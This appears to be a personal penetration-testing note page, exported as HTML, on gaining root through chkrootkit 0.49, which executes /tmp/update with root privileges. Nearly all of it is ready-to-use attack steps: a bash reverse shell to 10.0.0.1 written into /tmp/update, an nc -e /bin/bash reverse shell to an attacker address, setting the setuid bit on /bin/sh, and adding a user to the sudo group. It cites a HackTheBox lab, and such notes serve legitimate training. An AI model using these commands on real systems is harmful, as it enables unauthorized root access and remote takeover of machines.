<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>chkrootkit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h2># chkrootkit</h2></strong><br /><br /><strong><h2>## Exploits</h2></strong><br /><code>chkrootkit -V</code><br /><br /><strong><h3>### chkrootkit version 0.49</h3></strong><br /><a href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a><br /><br />chkrootkit version 0.49 runs the file <code>/tmp/update</code> with root permissions, regardless of who owns it.<br />Therefore, you can put whatever commands you like in <code>/tmp/update</code>, and they&#39;ll be run as root.<br /><br /><strong>EVEN IF YOU CAN&#39;T READ THE CHKROOTKIT VERSION </strong><br />(because you don&#39;t have permissions to run chkrootkit)<br /><strong>TRY THIS EXPLOIT ANYWAY</strong><br />(lesson learnt from hackthebox Nineveh).<br /><br /><strong>#### Reverse shell as root</strong><br />1) Start listener on attacking machine to receive shell<br />2) Create /tmp/update with bash reverse shell inside in<br />   1- <code>echo &quot;#!/bin/bash&quot; &gt; /tmp/update</code><br />   2- <code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&quot; &gt;&gt; /tmp/update</code><br />3) Make /tmp/update executable<br />   1- <code>chmod +x /tmp/update</code><br /><br /><strong>#### Non reverse shell options</strong><br /><code>chmod +s /bin/sh</code> - add a setuid bit to /bin/sh. all you have to do then is run /bin/sh<br /><code>adduser bob sudo</code> - add a new user and make them part of the sudo group<code><br />nc &lt;attacking ip&gt; &lt;attacker&#39;s listening port&gt; -e /bin/bash</code><br /><br /></div>
</body>
</html>
